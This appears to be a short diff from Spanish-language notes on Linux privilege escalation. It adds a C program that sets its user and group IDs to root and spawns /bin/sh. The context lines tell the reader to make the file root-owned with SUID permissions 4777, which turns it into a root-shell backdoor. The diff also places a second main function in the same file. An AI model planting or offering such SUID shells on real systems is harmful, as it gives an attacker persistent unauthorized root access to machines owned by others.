@@ -33,6 +33,18 @@ int main() {
 	return 0;
 }
 
+#include <sys/types.h>
+#include <unistd.h>
+
+int main() {
+
+setuid(0);
+setgid(0);
+system("/bin/sh");
+return 0;
+
+}
+
 Ponerle propietario root y SUID desde nuestro terminal, no la shell
 chown root:root archivo
 chmod 4777 archivo
